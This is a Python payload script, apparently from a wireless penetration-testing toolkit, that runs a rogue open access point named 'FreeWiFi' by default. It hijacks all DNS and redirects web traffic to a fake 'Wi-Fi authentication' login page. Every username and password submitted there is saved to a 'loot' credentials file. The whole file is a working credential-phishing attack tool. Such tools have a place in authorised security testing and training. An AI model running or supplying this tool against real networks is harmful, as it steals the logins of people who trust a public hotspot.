#!/usr/bin/env python3
# @active: true
# @web: true
# @name: Captive Portal
# @desc: Start a bounded access point and DNS-redirect captive portal on a selected adapter, serve a built-in page, and store submitted form data in loot.
# @category: wifi
# @danger: true
# @inputs: [{"name":"ssid","label":"Access point SSID","type":"text","default":"FreeWiFi"},{"name":"channel","label":"Channel","type":"number","default":"6"},{"name":"seconds","label":"Run duration","type":"number","default":"300"}]

import html
import json
import os
import shutil
import signal
import subprocess
import sys
import threading
import time
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))
from payloads._iface_helper import list_interfaces
from payloads._web_input import request_input

GATEWAY = "10.0.77.1"
PORT = 80
LOGIN_PAGE = b"""<!doctype html><meta name=viewport content='width=device-width'>
<title>Wi-Fi authentication</title><style>body{font:16px sans-serif;max-width:30rem;margin:4rem auto;padding:1rem}
input,button{box-sizing:border-box;width:100%;padding:.8rem;margin:.4rem 0}</style>
<h1>Wi-Fi authentication</h1><p>Sign in to continue.</p><form method=post action=/login>
<input name=username placeholder='Username or email' required><input name=password type=password placeholder=Password required>
<button>Connect</button></form>"""
SUCCESS_PAGE = b"<!doctype html><meta name=viewport content='width=device-width'><h1>Connected</h1><p>You may close this page.</p>"


def choose_interface():
    items = [x for x in list_interfaces("wifi") if x.get("supports_ap")]
    if not items:
        print("No AP-capable Wi-Fi interface found", flush=True)
        return None
    choices = [{"value": x["name"], "label": f"{x['name']} · {x.get('bus') or 'unknown'} · AP capable"} for x in items]
    return str(request_input("Select AP-capable Wi-Fi interface", input_type="select", choices=choices))


def run(cmd, check=True, timeout=15):
    result = subprocess.run(cmd, text=True, capture_output=True, timeout=timeout)
    if check and result.returncode:
        raise RuntimeError((result.stderr or result.stdout or "command failed").strip())
    return result


def stop_process(proc):
    if proc and proc.poll() is None:
        os.killpg(proc.pid, signal.SIGTERM)
        try:
            proc.wait(timeout=8)
        except subprocess.TimeoutExpired:
            os.killpg(proc.pid, signal.SIGKILL)


def configure_interface(iface):
    run(["sudo", "-n", "ip", "link", "set", iface, "down"])
    run(["sudo", "-n", "iw", "dev", iface, "set", "type", "__ap"])
    run(["sudo", "-n", "ip", "addr", "flush", "dev", iface])
    run(["sudo", "-n", "ip", "addr", "add", f"{GATEWAY}/24", "dev", iface])
    run(["sudo", "-n", "ip", "link", "set", iface, "up"])


def restore_interface(iface):
    for cmd in (["sudo", "-n", "iptables", "-t", "nat", "-D", "PREROUTING", "-i", iface,
                 "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-ports", str(PORT)],
                ["sudo", "-n", "ip", "addr", "flush", "dev", iface],
                ["sudo", "-n", "ip", "link", "set", iface, "down"],
                ["sudo", "-n", "iw", "dev", iface, "set", "type", "managed"],
                ["sudo", "-n", "ip", "link", "set", iface, "up"]):
        run(cmd, check=False)


def write_configs(directory, iface, ssid, channel):
    hostapd = directory / "hostapd.conf"
    dnsmasq = directory / "dnsmasq.conf"
    hostapd.write_text(
        f"interface={iface}\ndriver=nl80211\nssid={ssid}\nhw_mode=g\nchannel={channel}\n"
        "auth_algs=1\nwmm_enabled=0\nignore_broadcast_ssid=0\n", encoding="utf-8")
    dnsmasq.write_text(
        f"interface={iface}\nbind-interfaces\ndhcp-range=10.0.77.10,10.0.77.250,12h\n"
        f"dhcp-option=3,{GATEWAY}\ndhcp-option=6,{GATEWAY}\naddress=/#/{GATEWAY}\n", encoding="utf-8")
    return hostapd, dnsmasq


def handler_for(log_path):
    lock = threading.Lock()

    class Handler(BaseHTTPRequestHandler):
        def send_page(self, body):
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers(); self.wfile.write(body)

        def do_GET(self):
            self.send_page(LOGIN_PAGE)

        def do_POST(self):
            try:
                length = min(int(self.headers.get("Content-Length", "0")), 16384)
            except ValueError:
                length = 0
            fields = {k: v[-1] for k, v in parse_qs(self.rfile.read(length).decode(errors="replace")).items()}
            event = {"timestamp": datetime.now().isoformat(), "client": self.client_address[0], "fields": fields}
            with lock, log_path.open("a", encoding="utf-8") as output:
                output.write(json.dumps(event) + "\n")
            print(f"Credential submission from {self.client_address[0]} fields={list(fields)}", flush=True)
            self.send_page(SUCCESS_PAGE)

        def log_message(self, fmt, *args):
            return

    return Handler


def main():
    for tool in ("hostapd", "dnsmasq", "iw", "ip", "iptables"):
        if not shutil.which(tool):
            print(f"Missing required tool: {tool}", flush=True)
            return 127
    ssid = sys.argv[1] if len(sys.argv) > 1 else "FreeWiFi"
    if not 1 <= len(ssid.encode()) <= 32 or "\n" in ssid:
        print("SSID must be 1-32 bytes without newlines", flush=True); return 2
    try:
        channel = int(sys.argv[2]) if len(sys.argv) > 2 else 6
        seconds = float(sys.argv[3]) if len(sys.argv) > 3 else 300.0
    except ValueError:
        print("Channel and duration must be numeric", flush=True); return 2
    if channel not in range(1, 14) or not 10 <= seconds <= 3600:
        print("Channel must be 1-13 and duration 10-3600 seconds", flush=True); return 2
    iface = choose_interface()
    if not iface:
        return 1
    loot = Path(os.environ["CITYPOP_LOOT"]) / "Portal"
    loot.mkdir(parents=True, exist_ok=True)
    hostapd_proc = dnsmasq_proc = server = thread = None
    try:
        hostapd_conf, dnsmasq_conf = write_configs(loot, iface, ssid, channel)
        configure_interface(iface)
        run(["sudo", "-n", "iptables", "-t", "nat", "-A", "PREROUTING", "-i", iface,
             "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-ports", str(PORT)])
        hostapd_proc = subprocess.Popen(["sudo", "-n", "hostapd", str(hostapd_conf)], start_new_session=True)
        dnsmasq_proc = subprocess.Popen(["sudo", "-n", "dnsmasq", "--no-daemon", "--conf-file", str(dnsmasq_conf)],
                                        start_new_session=True)
        log_path = loot / f"credentials_{time.strftime('%Y%m%d_%H%M%S')}.jsonl"
        server = ThreadingHTTPServer((GATEWAY, PORT), handler_for(log_path))
        thread = threading.Thread(target=server.serve_forever, daemon=True); thread.start()
        print(f"Access point: {ssid} · Interface: {iface} · Channel: {channel}", flush=True)
        print(f"Portal address after joining the AP: http://{GATEWAY}:{PORT}/", flush=True)
        print(f"Duration: {seconds:g}s · Submission log: {log_path}", flush=True)
        deadline = time.monotonic() + seconds
        while time.monotonic() < deadline:
            time.sleep(min(5, deadline - time.monotonic()))
            if hostapd_proc.poll() is not None or dnsmasq_proc.poll() is not None:
                raise RuntimeError("hostapd or dnsmasq exited unexpectedly")
        return 0
    except KeyboardInterrupt:
        print("Stopping portal", flush=True); return 0
    except (RuntimeError, OSError, subprocess.SubprocessError) as exc:
        print(f"Portal failed: {exc}", flush=True); return 1
    finally:
        if server:
            server.shutdown(); server.server_close()
        stop_process(hostapd_proc); stop_process(dnsmasq_proc)
        restore_interface(iface)


if __name__ == "__main__":
    raise SystemExit(main())
